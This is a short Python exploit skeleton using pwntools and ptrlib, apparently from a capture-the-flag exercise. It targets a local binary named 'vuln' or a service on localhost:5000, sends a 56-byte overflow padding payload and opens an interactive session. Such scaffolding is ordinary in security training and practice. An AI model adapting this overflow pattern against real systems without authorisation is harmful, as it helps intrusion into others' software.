#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./vuln")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("./")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b"A" * (64 - 8)
    input(">> ")
    io.sendline(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
